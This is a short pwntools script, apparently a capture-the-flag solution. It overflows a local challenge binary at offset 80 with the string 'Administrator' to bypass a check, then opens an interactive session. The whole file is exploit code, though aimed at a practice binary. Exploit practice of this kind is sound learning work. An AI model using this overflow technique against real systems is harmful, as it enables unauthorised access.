from pwn import *

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript='''

'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = start()

offset = 80
payload = flat({offset : [b'Administrator']})

io.sendline(payload)

io.interactive()

